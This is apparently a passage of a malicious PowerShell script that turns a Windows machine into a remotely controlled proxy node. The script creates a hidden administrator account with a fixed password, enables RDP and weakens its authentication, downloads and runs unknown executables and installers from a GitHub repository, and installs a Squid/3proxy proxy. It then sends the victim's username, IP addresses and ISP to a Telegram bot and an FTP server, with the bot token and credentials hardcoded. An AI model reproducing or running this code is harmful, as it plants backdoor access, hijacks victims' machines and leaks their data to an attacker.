    } catch {

        Write-Host "Failed hiden user"

		#Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "UserDefault" -Value 0 -Type DWord -Force

    }

}

function Get-squid-dow {

    try {

        $user = (Get-ChildItem Env:USERNAME).Value

        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'

		$path_s = $path_dir + "\squidd"

		New-Item -ItemType "directory" -Path $path_s

		#Add-MpPreference -ExclusionPath $path_s

		

		#$url3 = "https://ownlifeyouforwithme.com/plo -O $env:PUBLIC\\abc.msi"

		#$local_path3 = $path_s + "\abc.msi" 

		#Invoke-WebRequest -Uri $url3 -OutFile $local_path3

		

		

		$is64Bit = Test-Path C:\Windows\SysNative

		if (!($is64Bit))

		{

			$download_url = "https://github.com/Dmitry19794/ps/raw/refs/heads/main/Win64OpenSSL_Light-3_4_1.msi"

			$local_path = $path_s + "\Win640penSSL_Light-3_4_1.msi" 

		}

		Else {

             $download_url = "https://github.com/Dmitry19794/ps/raw/refs/heads/main/Win320penSSL_Light-3_4_1.msi"

		     $local_path = $path_s + "\Win320penSSL_Light-3_4_1.msi"  

        }

		

		$WebClient = New-Object System.Net.WebClient

		$WebClient.DownloadFile($download_url, $local_path)	

        $download_url2 = "https://github.com/Dmitry19794/ps/raw/refs/heads/main/Squid.zip"

		

		$path_arch = $path_dir + "\Squid.zip"

		

		

		$local_path = $path_s + "\Squid.zip" 

		$WebClient = New-Object System.Net.WebClient

		$WebClient.DownloadFile($download_url2, $local_path)

		

		Expand-Archive $local_path -DestinationPath $path_dir



		#$process.ExitCode

		$ms = "Successfully get file"

		#Remove-file

		

		send-tg-msg($ms)

        Write-Host "Successfully get file"

    } catch {

        Write-Host "Failed file"

		Write-Host $error[0].Exception

    }

}

function Settings-squid {

    try {

        #$Data = @()

        $user = (Get-ChildItem Env:USERNAME).Value

        $ip_intf = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress

		#$Data += $ip_intf

        $path_dir = 'C:\Users\'+ $user + '\AppData\Local\Squid\etc\squid\'

		Stop-Service -Name squidsrv



        $Data = ("acl localnet src 185.177.239.114",

				"acl localnet src 10.0.0.0/8",

				"acl localnet src 172.16.0.0/12",

				"acl localnet src 192.168.0.0/16",

				"acl localnet src fc00::/7",

				"acl localnet src fe80::/10",

				"acl SSL_ports port 443",

				"acl Safe_ports port 80",

				"acl Safe_ports port 21",

				"acl Safe_ports port 443",

				"acl Safe_ports port 70",

				"acl Safe_ports port 210",

				"acl Safe_ports port 1025-65535",

				"acl Safe_ports port 280",

				"acl Safe_ports port 488",

				"acl Safe_ports port 591",

				"acl Safe_ports port 777",

				"acl CONNECT method CONNECT",

				"acl ipv4_from src ipv4",

				"acl ipv4_to dst ipv4",

				"http_access allow localhost manager",

				"http_access deny manager",

				"http_access deny !Safe_ports",

				"http_access deny CONNECT !SSL_ports",

				"#http_access allow localnet",

				"http_access allow localhost",

				"acl localnet src 185.177.239.114",

				"http_access deny all",

				"http_port 8080",

				"coredump_dir /var/cache/squid",

				"refresh_pattern ^ftp: 1440 20% 10080",

				"refresh_pattern ^gopher: 1440 0% 1440",

				"refresh_pattern -i (/cgi-bin/|\?) 0 0% 0",

				"refresh_pattern . 0 20% 4320",

				"dns_nameservers 8.8.8.8",

				"max_filedescriptors 3200",

				"access_log /var/log/squid/access2.log squid",

				"cache_log /var/log/squid/cache2.log")



        $Filepath = $path_dir + "squid.conf" 

        $Data | Out-File -FilePath $Filepath -Force

        Start-Service -Name squidsrv 

		 

        Write-Host "Successfully get file"

    } catch {

        Write-Host "Failed file"

		Write-Host $error[0].Exception

    }

}

function Get-Ftp ($Filepath, $ip) {

	$user = (Get-ChildItem Env:USERNAME).Value

	$path_dir = 'C:\Users\'+ $user + '\AppData\Local'

	$download_url = "https://github.com/Dmitry19794/ps/raw/0cad0e3a063f7d13790ef9fa591356e15b452ddb/WinSCP.zip"

	$path_arch = $path_dir + "\WinSCP.zip"

	

	$local_path = $path_dir + "\WinSCP.zip" 

	$WebClient = New-Object System.Net.WebClient

	$WebClient.DownloadFile($download_url, $local_path)

	

	Expand-Archive $local_path -DestinationPath $path_dir



    $scp_path = $path_dir + "\WinSCP\WinSCPnet.dll"

	

	Add-Type -Path $scp_path

	$sessionOptions = New-Object WinSCP.SessionOptions -Property @{

		Protocol = [WinSCP.Protocol]::Ftp

		FtpMode = [WinSCP.FtpMode]::Passive

		HostName = "185.177.239.114"

		UserName = "zverus"

		Password = "asme778526"

	}



	$sessionOptions.AddRawSettings("ProxyPort", "21")

	$session = New-Object WinSCP.Session



	try

	{

		# Connect

		$session.Open($sessionOptions)

		Send-tg-msg ("Connect ftp!")



		# Download files

	    #$session.GetFiles("C:\Users\home\AppData\Localserv*.txt", "C:\1\").Check())

		#$directory = $session.ListDirectory("C:\serv\")

		#Send-tg-msg ($directory)

		$dist_path = $ip + ".txt"

		$transferResult = $session.PutFiles($Filepath, $dist_path, $True, $transferOptions)

        $transferResult.Check()

        Send-tg-msg ("Successfully file upload!")

	}

	finally

	{

		$session.Dispose()

	}

}     

function Get-ftp2 {

    try {

        $ftp = "ftp 185.177.239.114"

		$user = 'zverus'

		$pass = 'qwerty'

		$folder = 'FTP_Folder'

		$target = "C:\Folder\Folder1\"

		$webclient = New-Object System.Net.WebClient

        $webclient.Credentials = New-Object System.Net.NetworkCredential($user, $pass)

		Write-Host $webclient.Credentials

		

		$filePath = "C:\Users\AppData\bin\3proxy.cfg"

        $ftpUploadUrl = "$ftpServer/3proxy.cfg"

        $client.UploadFile($ftpUploadUrl, "STOR", $filePath)



        #$webclient.UploadFile($ftpUpload, "STOR", $file)

		

		#$credentials = new-object System.Net.NetworkCredential($user, $pass)

		#Write-Host $credentials

		#$folderPath= $ftp + "/" + $folder + "/"

        #$files = Get-FTPDir -url $folderPath -credentials $credentials

        #Write-Host $files

		

		

        Write-Host "Successfully send ftp"

    } catch {

        Write-Host "Failed send ftp"

		#Write-Host $error[0].Exception

    }

}

function Install-file {

    try {

		$user = (Get-ChildItem Env:USERNAME).Value

        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'

		$path_bin = $path_dir + "\bin"

		$cm = "icacls " + $path_bin + " /grant " + $user + ":F" + " /t"

		$result = cmd /k $cm #даем права

		#write-host $result

		$path_exe = $path_bin + "\3proxy.exe"

		Start-Process -FilePath $path_exe -Verb runAs

		#C:\Windows\System32 /k 'C:\Users\home\AppData\bin\3proxy.exe'

		cmd /k 'C:\Users\home\AppData\bin\3proxy.exe'

		#Invoke-Item -Path 'C:\Users\AppData\bin\3proxy.exe --install'

		

        Write-Host "Successfully install file"

    } catch {

        Write-Host "Failed install file"

		Write-Host $error[0].Exception

    }

}

function Send-tg-file ($m){

    try {

       $tg_token="6197428016:AAF6OQ263Z-sHt8pQwJIpcgpiMacJt63sn4"

       $tg_chat_id="5072207416"

       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

	   #$message=$m

	   $message = Get-Content $m

       $Response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($tg_token)/sendMessage?chat_id=$($tg_chat_id)&text=$($Message)"

    } catch {

        Write-Host "Failed send message"

		Write-Host $error[0].Exception

    }

}

function Send-tg-msg ($m){

    try {

       $tg_token="6197428016:AAF6OQ263Z-sHt8pQwJIpcgpiMacJt63sn4"

       $tg_chat_id="5072207416"

       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

	   $message=$m

       $Response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($tg_token)/sendMessage?chat_id=$($tg_chat_id)&text=$($Message)"

       #Write-Host "Successfully send message"

    } catch {

        Write-Host "Failed send message"

		#Write-Host $error[0].Exception

    }

}

function Rename-file {

    try {

		

		Rename-Item -Path "C:\Users\home\AppData\Local\Squid\etc\squid\cachemgr.conf.default" -NewName "C:\Users\home\AppData\Local\Squid\etc\squid\cachemgr.conf"

        Rename-Item -Path "C:\Users\home\AppData\Local\Squid\etc\squid\mime.conf.default" -NewName "C:\Users\home\AppData\Local\Squid\etc\squid\mime.conf"

		Rename-Item -Path "C:\Users\home\AppData\Local\Squid\etc\squid\squid.conf.default" -NewName "C:\Users\home\AppData\Local\Squid\etc\squid\squid.conf"

		Rename-Item -Path "C:\Users\home\AppData\Local\Squid\etc\squid\squid_radius_auth.conf.default" -NewName "C:\Users\home\AppData\Local\Squid\etc\squid\squid_radius_auth.conf"

		

		Write-Host "Successfully rename"

    } catch {

        Write-Host "Failed rename"

		Write-Host $error[0].Exception

    }

}

function Remove-file {

    try {

        $user = (Get-ChildItem Env:USERNAME).Value

        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'

        $path_del = $path_dir + "\Squid\etc\squid\cachemgr.conf.default"

        $path_del1 = $path_dir + "\Squid\etc\squid\mime.conf.default"

        $path_del2 = $path_dir + "\Squid\etc\squid\squid.conf.default"

		$path_del3 = $path_dir + "\Squid\etc\squid\errorpage.css.default"

        $path_del4 = $path_dir + "\squidd"		

		Remove-Item -Path $path_del

        Remove-Item -Path $path_del1

		Remove-Item -Path $path_del2

		Remove-Item -Path $path_del3

		Remove-Item -LiteralPath $path_del4 -Force -Recurse

		Send-tg-msg ("Successfully remove")

    } catch {

        Send-tg-msg ("Failed remove")

		Send-tg-msg ($error[0].Exception)

    }

}

function Add-user{

	try{
        Send-tg-msg("Start ps...")
		$Data = @()

		$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress

		$pass = ConvertTo-SecureString "12345678" -AsPlainText -Force

		New-LocalUser -Name UserDefault -Password $pass

		Add-LocalGroupMember -Group Administrators -Member UserDefault

		Enable-LocalUser UserDefault

		

		#Get-Item C:\Users\UserDefault -Force | foreach { $_.Attributes = $_.Attributes -bor "Hidden" }#скрываем папку

		#New-Item -ItemType "directory" -Path "c:\Users\UserDefault" 

		#Send-tg-msg("Successfully add user")

		

        $st = "Added a new user - Yes"

		$Data += $st

		$user = (Get-ChildItem Env:USERNAME).Value

        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'

		$Filepath = $path_dir + "\" + $ip + ".txt"

		$Data | Out-File -FilePath $Filepath

		#return $Data

	}

    catch {

		  $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress

		  $user = (Get-ChildItem Env:USERNAME).Value

          $path_dir = 'C:\Users\'+ $user + '\AppData\Local'

          $st = "Added a new user - No"

		  $Data += $st

		  $Filepath = $path_dir + "\" + $ip + ".txt"

		  $Data | Out-File -FilePath $Filepath

		  #return $Data

    }	

}

function Enable-rdp {

	try{

		Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

	    #Send-tg-msg ("Successfully enabled RDP")

		

	    Set-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Terminal Server Client" -Name "AuthenticationLevelOverride" -Value 0 -Type DWord -Force

	    

	    #$obj = (Invoke-WebRequest ipinfo.io).Content

		#$json = $obj | ConvertFrom-Json

		#$ip = $json.ip



	    #$command = "cmdkey" + " /generic:" + $ip + " /user:UserDefault /pass:12345678"

	    #Invoke-Expression -Command "cmd /c $command"



	    #$cm = "mstsc /v:" + $ip

	    #$cnd = $command + " & " + $cm 

	    #Invoke-Expression -Command "cmd /c $cnd"

        #cmd /k $cnd

		

		$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress

		$st = "Added RDP - Yes"

		#$Data += $st

		$user = (Get-ChildItem Env:USERNAME).Value

        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'

		$Filepath = $path_dir + "\" + $ip + ".txt"

		Add-Content -Path $Filepath -Value $st

		#$st | Out-File -FilePath $Filepath -

		#return $Datan

	}

    catch {

        #Send-tg-msg ("Failed enabled RDP")

		$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress

		$st = "Added RDP - No"

		#$Data += $st

		$user = (Get-ChildItem Env:USERNAME).Value

        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'

		$Filepath = $path_dir + "\" + $ip + ".txt"

		Add-Content -Path $Filepath -Value $st

    }	

}

function Copy-folders{

	try{

		$user = (Get-ChildItem Env:USERNAME).Value

        $source = 'C:\Users\'+ $user

		$destination = 'C:\Users\UserDefault'



		Get-ChildItem -Path $Source -Recurse | Where-Object { $_.PSIsContainer } | ForEach-Object {

		$dest = Join-Path $destination $_.FullName.Substring($Source.length);

		New-Item -ItemType Directory -Path $dest -Force;

        }

		

	    Send-tg-msg ("Successfully copy folder")

	}

    catch {

        Send-tg-msg ("Failed copy folder")

    }	

}

function Get-cookies {

    try {

		param([string]$RegKeyPath,[string]$Value)

		if(test-path $RegKeyPath)

		{

			(Get-ItemProperty $RegKeyPath).$Value -ne $null



		}

		else

		{

			$false

		}

        

		

		Copy-Item -Path "SourcePath" -Destination "DestinationPath" -Recurse



        Send-tg ("Successfully get cookies")

    } catch {

        Send-tg ("Failed get cookies")

		Send-tg ($error[0].Exception)

    }

}

function Hide-user {

    try {

        $securityCenterPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts"

        if (-not (Test-Path $securityCenterPath)) {

            New-Item -Path $securityCenterPath -Force | Out-Null

			#write-host 'made' 

        }

		#write-host 'not made'

		$securityCenterPath2 = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"

		if (-not (Test-Path $securityCenterPath2)) {

            New-Item -Path $securityCenterPath2 -Force | Out-Null

			#write-host 'made2' 

        }

        #write-host 	$securityCenterPath2	

        #New-Item –Path $securityCenterPath –Name UserList -Force

		

        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "UserDefault" -Value 0 -Type DWord -Force

        #Write-Host "Successfully hiden user"

        

    } catch {

        #Write-Host "Failed hiden user"

		Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "UserDefault" -Value 0 -Type DWord -Force

    }

}

function ConvertFrom-Json20([object] $item){

        Add-Type -AssemblyName System.Web.Extensions

        $ps_js = New-Object System.Web.Script.Serialization.JavaScriptSerializer

        return ,$ps_js.DeserializeObject($item)

        

    }

function Get-exe {

    try {

        $user = (Get-ChildItem Env:USERNAME).Value

        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'

		$path_s = $path_dir + "\squidd"

		New-Item -ItemType "directory" -Path $path_s

			

        $download_url = "https://github.com/Dmitry19794/ps/raw/refs/heads/main/exe.exe"

		

		$local_path = $path_s + "\exe.exe"	

		$WebClient = New-Object System.Net.WebClient

		$WebClient.DownloadFile($download_url, $local_path)

		

		$process = Start-Process -FilePath $local_path -PassThru -Wait

		$process.ExitCode

		

		#If (process.ExitCode -eq 0) {

			#Send-tg-msg ("Successfully get exe")

        #}

        #Else {

			#Send-tg-msg ("Failed get exe")

        #}

	    

		$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress

		$st = "Start exe - Yes"

		#$Data += $st

		$user = (Get-ChildItem Env:USERNAME).Value

        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'

		$Filepath = $path_dir + "\" + $ip + ".txt"

		Add-Content -Path $Filepath -Value $st

		

		#$path_del = $path_dir + "\squidd"		

		#Remove-Item -LiteralPath $path_del -Force -Recurse

    } catch {

        #Send-tg-msg ("Failed get exe")

		#Send-tg-msg ($error[0].Exception)

		$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress

		$user = (Get-ChildItem Env:USERNAME).Value

        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'

		$st = "Start exe - No"

		Add-Content -Path $Filepath -Value $st

    }

	

}

function Get-msi {

    try {

        $user = (Get-ChildItem Env:USERNAME).Value

        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'

		$path_s = $path_dir + "\squidd"

        New-Item -ItemType "directory" -Path $path_s		

        #$url = "https://github.com/Dmitry19794/ps/raw/refs/heads/main/Tencent.zip"

        $url = "https://github.com/Dmitry19794/ps/raw/refs/heads/main/GmRemote.zip"

        

        #$path_arch = $path_s + "\Tencent.zip"

		#$local_path = $path_s + "\Tencent.msi" 	

		$path_arch = $path_s + "\GmRemote.zip"

		$local_path = $path_s + "\GmRemote.msi" 

		

		

		$WebClient = New-Object System.Net.WebClient

		$WebClient.DownloadFile($url, $path_arch)

		

		Expand-Archive $path_arch -DestinationPath $path_s

        

        #$path_exe = $path_s + "\Tencent.msi"

        $path_exe = $path_s + "\GmRemote.msi"

		

		#-Verb runAs

		

		#$process = Start-Process -FilePath $path_exe -PassThru -Wait

		#$process.ExitCode

		

		$process = Start-Process -FilePath $path_exe -PassThru -Wait

		$process.ExitCode

		

		$path_del = $path_dir + "\squidd"		

		Remove-Item -LiteralPath $path_del -Force -Recurse

		

		$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress

		$st = "Start msi - Yes"

		#$Data += $st

		$user = (Get-ChildItem Env:USERNAME).Value

        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'

		$Filepath = $path_dir + "\" + $ip + ".txt"

		Add-Content -Path $Filepath -Value $st

		

		Send-tg-msg ("Successfully get msi")

    } catch {

		$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress

		$user = (Get-ChildItem Env:USERNAME).Value

        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'

		$st = "Start msi - No"

		Add-Content -Path $Filepath -Value $st

		

        Send-tg-msg "Failed get msi"

		Send-tg-msg $error[0].Exception

    }

}

function Get-squid {

    try {

        $user = (Get-ChildItem Env:USERNAME).Value

        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'

		$path_s = $path_dir + "\squidd"

		New-Item -ItemType "directory" -Path $path_s

		

		$is64Bit = Test-Path C:\Windows\SysNative

		if (!($is64Bit))

		{

			$download_url = "https://github.com/Dmitry19794/ps/raw/refs/heads/main/Win64OpenSSL_Light-3_4_1.msi"

			$local_path = $path_s + "\Win640penSSL_Light-3_4_1.msi" 

		}

		Else {

             $download_url = "https://github.com/Dmitry19794/ps/raw/refs/heads/main/Win320penSSL_Light-3_4_1.msi"

		     $local_path = $path_s + "\Win320penSSL_Light-3_4_1.msi"  

        }

		

		$WebClient = New-Object System.Net.WebClient

		$WebClient.DownloadFile($download_url, $local_path)	

        $download_url2 = "https://github.com/Dmitry19794/ps/raw/refs/heads/main/squid.msi"

		

		$path_arch = $path_dir + "\squid.msi"

		

		$local_path = $path_s + "\squid.msi" 

		$WebClient = New-Object System.Net.WebClient

		$WebClient.DownloadFile($download_url2, $local_path)



		$command = " /i " + $local_path + " /quiet /qn /norestart /log " + $path_dir + "\install.log" + " TARGETDIR=" + $path_dir

		$process = Start-Process `C:\Windows\System32\msiexec.exe ` -ArgumentList $Command -PassThru -Wait

		$process.ExitCode

		Remove-Item "C:\Users\*\Desktop\Squid*"

		Remove-file

		

		$download_url3 = "https://github.com/Dmitry19794/ps/raw/refs/heads/main/script.zip"		

		$path_arch = $path_s + "\script.zip" 

		$WebClient = New-Object System.Net.WebClient

		$WebClient.DownloadFile($download_url3, $path_arch)

		

		$local_path = $path_dir + "\Squid"

		#Expand-Archive $path_arch -DestinationPath $local_path

		

		$command = $local_path + "\InstallConfig.bat"

		#$process = Start-Process -FilePath $command -Verbose Runas -NoNewWindow -PassThru -Wait

		#$process = Start-Process -FilePath $command -Verbose Runas -PassThru -Wait

		#$process.ExitCode

		

        $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress

		$st = "Added proxy - Yes"

		#$Data += $st

		$user = (Get-ChildItem Env:USERNAME).Value

        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'

		$Filepath = $path_dir + "\" + $ip + ".txt"

		Add-Content -Path $Filepath -Value $st

		

		Settings-squid



		#Send-tg-msg ("Successfully delete")

        #Send-tg-msg ("Successfully get squid")

    } catch {

		$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress

		$user = (Get-ChildItem Env:USERNAME).Value

        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'

		$Filepath = $path_dir + "\" + $ip + ".txt"

		$st = "Added RDP - No"

		$user = (Get-ChildItem Env:USERNAME).Value

		Add-Content -Path $Filepath -Value $st



        #Send-tg-msg ("Failed get squid")

		write-host($error[0].Exception)

    }

	

}

function Get-data {

    try {

		$Datas = @()

		$user = (Get-ChildItem Env:USERNAME).Value

		$ip_intf = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress

		$st = "User - " + $user

		$Datas += $st

		$st4 = "IP - " + $ip_intf

		$Datas += $st4		

        #(Invoke-WebRequest ifconfig.me/ip).Content

		$obj = (Invoke-WebRequest ipinfo.io).Content

		$json = $obj | ConvertFrom-Json

		#$variableType = $obj.GetType()

		#Write-Host $variableType

		$ip = $json.ip

		$st1 = "IP - " + $ip

		$Datas += $st1

		$reg = $json.region

		$st2 = "Country - " + $req

		$Datas += $st2

		$org = $json.org

		$st3 = "ISP - " + $org

		$Datas += $st3

		

		#$jsonObject = $jsonString | ConvertFrom-Json

        #Write-Host $jsonObject.Company.Departments[0].Employees[1].Name

		$ping = Test-Connection ams.speedtest.clouvider.net -Count 1

		$Data += $ping.ResponseTime

		

        $url = "https://github.com/ili101/PPerf/archive/refs/heads/master.zip"

        $user = (Get-ChildItem Env:USERNAME).Value

        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'

        $local_path = $path_dir + "\master.zip" 

		$WebClient = New-Object System.Net.WebClient

		$WebClient.DownloadFile($url, $local_path)

		$path_arch = $path_dir + "\master.zip"

		

		Expand-Archive $path_arch -DestinationPath $path_dir

		

		$path_perf = $path_dir + "\PPerf-master\Bin\iperf3.exe"

		$serv = "ams.speedtest.clouvider.net -p 5203"

		$iPerf = $path_perf

		$Param ="-c " + $serv + " -t 10 -f m"

		$Param = $Param.Split(" ")

		$Array = & "$iPerf" $Param

	    #$Array | Get-Member

		#$date=Get-Date -Uformat "%y/%m/%d %H:%M:%S"

		$Datas += $Array[15]

		$Filepath = $path_dir + "\" + $ip + ".txt"

		

		$Datas | Out-File -FilePath $Filepath -append

		#Out-File -FilePath $path_dir + "$ip" + ".txt" -InputObject $date, $Array[327], $Array[328] -append

        #Send-tg-msg ("Successfully get data")

		Send-tg-file($Filepath)

		Get-Ftp $Filepath $ip

    } catch {

		$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress

		$user = (Get-ChildItem Env:USERNAME).Value

        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'

		$Filepath = $path_dir + "\" + $ip + ".txt"

		$st = "Get data - No"

		Add-Content -Path $Filepath -Value $st

        #Send-tg-msg ("Failed get data")

		#Send-tg-msg ($error[0].Exception)

    }

}

function Rem {

	Remove-Item "C:\Users\*\Desktop\Squid*"

	}

#=========main==================

#DisableDefender
#Get-msi
Add-user
Enable-rdp
#Hide-user
Install-proxy
Get-exe
Get-data

